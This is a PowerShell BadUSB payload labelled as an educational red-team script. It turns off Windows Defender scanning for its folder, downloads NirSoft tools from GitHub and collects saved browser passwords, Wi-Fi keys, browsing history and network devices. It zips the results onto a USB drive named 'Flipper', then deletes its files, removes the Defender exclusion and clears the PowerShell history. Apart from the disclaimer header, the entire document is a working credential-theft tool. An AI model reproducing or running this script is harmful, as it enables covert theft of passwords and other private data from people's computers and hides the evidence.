# ⚠️ Educational Red Team Script (DO NOT USE MALICIOUSLY)

#**DISCLAIMER:**  
#This script is intended solely for **educational and authorized penetration testing** in controlled environments.  
#**DO NOT** use this code on any device or network you do not own or have explicit permission to test.  
#Unauthorized use may violate local, state, or federal laws.
#Created for research and red team demonstrations only.                               

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# Download necessary tools
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe


# Execute tools to gather data
.\WNetWatcher.exe /stext connected_devices.txt
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
.\WebBrowserPassView.exe /stext passwords.txt
.\WirelessKeyView.exe /stext wifi.txt

# Wait for the files to be fully written
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Seconds 1
}

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# Copy ZIP to USB named "Flipper"
$d = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'Flipper' }).DeviceID
if ($d) {
    Copy-Item -Path "$dumpFile" -Destination "$d\dump.zip" -Force
}

Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit
